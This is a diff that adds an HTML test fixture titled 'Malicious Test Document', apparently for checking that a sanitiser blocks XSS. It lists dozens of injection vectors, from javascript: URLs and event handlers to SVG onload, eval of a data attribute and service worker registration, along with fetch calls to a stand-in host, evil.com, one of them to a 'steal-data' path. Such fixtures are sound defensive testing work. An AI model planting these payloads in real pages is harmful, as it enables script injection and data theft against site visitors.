@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Test Document</title>
+    <style>
+        /* CSS with potential security issues */
+        body {
+            background: url('javascript:alert("XSS via CSS")');
+            font-family: Arial, sans-serif;
+        }
+        .malicious {
+            behavior: url('malicious.htc');
+            -moz-binding: url('malicious.xml#test');
+        }
+    </style>
+</head>
+<body>
+    <h1>Malicious Content Test</h1>
+    <p>This document contains various potentially malicious content for security testing.</p>
+    
+    <!-- Script injection attempts -->
+    <script>
+        alert('This script should be blocked');
+        fetch('http://evil.com/steal-data');
+    </script>
+    
+    <!-- Event handler injection -->
+    <div onclick="alert('XSS via onclick')" onmouseover="fetch('http://evil.com')">
+        Hover over this text
+    </div>
+    
+    <!-- JavaScript URL injection -->
+    <a href="javascript:alert('XSS via href')">Click me</a>
+    
+    <!-- Data URL with script -->
+    <img src="data:text/html,<script>alert('XSS via data URL')</script>" alt="Malicious image">
+    
+    <!-- Form with malicious action -->
+    <form action="javascript:alert('XSS via form action')">
+        <input type="text" name="test">
+        <button type="submit">Submit</button>
+    </form>
+    
+    <!-- Iframe with malicious source -->
+    <iframe src="javascript:alert('XSS via iframe')"></iframe>
+    
+    <!-- Object with malicious data -->
+    <object data="javascript:alert('XSS via object')"></object>
+    
+    <!-- Embed with malicious source -->
+    <embed src="javascript:alert('XSS via embed')">
+    
+    <!-- Meta refresh to malicious site -->
+    <meta http-equiv="refresh" content="0;url=javascript:alert('XSS via meta refresh')">
+    
+    <!-- Link with malicious href -->
+    <link rel="stylesheet" href="javascript:alert('XSS via link')">
+    
+    <!-- Base with malicious href -->
+    <base href="javascript:alert('XSS via base')">
+    
+    <!-- Style with expression (IE specific) -->
+    <div style="width: expression(alert('XSS via CSS expression'))">
+        CSS Expression Test
+    </div>
+    
+    <!-- SVG with script -->
+    <svg onload="alert('XSS via SVG')">
+        <circle cx="50" cy="50" r="40" fill="red"/>
+    </svg>
+    
+    <!-- Math element with script -->
+    <math>
+        <maction actiontype="statusline#http://evil.com">
+            <mrow>
+                <mi>x</mi>
+            </mrow>
+        </maction>
+    </math>
+    
+    <!-- HTML5 form attributes -->
+    <input type="text" formaction="javascript:alert('XSS via formaction')">
+    
+    <!-- Content with encoded scripts -->
+    <div>
+        &#60;script&#62;alert('Encoded XSS')&#60;/script&#62;
+    </div>
+    
+    <!-- CSS import with malicious URL -->
+    <style>
+        @import url('javascript:alert("XSS via CSS import")');
+        @import 'data:text/css,body{background:url(javascript:alert("XSS"))}';
+    </style>
+    
+    <!-- Malicious CSS with various techniques -->
+    <div class="malicious">
+        This div has malicious CSS classes
+    </div>
+    
+    <!-- Template with script -->
+    <template>
+        <script>alert('XSS in template')</script>
+    </template>
+    
+    <!-- Details with script in summary -->
+    <details>
+        <summary onclick="alert('XSS in summary')">Click to expand</summary>
+        <p>Hidden content</p>
+    </details>
+    
+    <!-- Audio/Video with malicious sources -->
+    <audio src="javascript:alert('XSS via audio')"></audio>
+    <video src="javascript:alert('XSS via video')"></video>
+    
+    <!-- Source elements with malicious src -->
+    <picture>
+        <source srcset="javascript:alert('XSS via source')" media="(min-width: 800px)">
+        <img src="fallback.jpg" alt="Test image">
+    </picture>
+    
+    <!-- Track element with malicious src -->
+    <video>
+        <track src="javascript:alert('XSS via track')" kind="captions">
+    </video>
+    
+    <!-- Malicious data attributes -->
+    <div data-malicious="javascript:alert('XSS via data attribute')" 
+         onclick="eval(this.dataset.malicious)">
+        Data attribute XSS
+    </div>
+    
+    <!-- Protocol handlers -->
+    <a href="mailto:test@example.com?subject=javascript:alert('XSS via mailto')">Email</a>
+    <a href="tel:javascript:alert('XSS via tel')">Phone</a>
+    
+    <!-- Malicious CSS animations -->
+    <style>
+        @keyframes malicious {
+            0% { background: url('javascript:alert("XSS via animation")'); }
+        }
+        .animated {
+            animation: malicious 1s;
+        }
+    </style>
+    <div class="animated">Animated element</div>
+    
+    <!-- WebGL shader injection (if supported) -->
+    <canvas id="maliciousCanvas"></canvas>
+    <script>
+        // This script should be blocked
+        const canvas = document.getElementById('maliciousCanvas');
+        const gl = canvas.getContext('webgl');
+        // Malicious shader code would go here
+    </script>
+    
+    <!-- Service worker registration (should be blocked) -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('malicious-worker.js');
+        }
+    </script>
+    
+    <!-- Web worker creation (should be blocked) -->
+    <script>
+        const worker = new Worker('data:application/javascript,alert("XSS via worker")');
+    </script>
+    
+    <!-- Malicious CSS filters -->
+    <div style="filter: url('javascript:alert(\"XSS via CSS filter\")')">
+        CSS Filter Test
+    </div>
+    
+    <!-- Malicious CSS transforms -->
+    <div style="transform: url('javascript:alert(\"XSS via CSS transform\")')">
+        CSS Transform Test
+    </div>
+</body>
+</html>
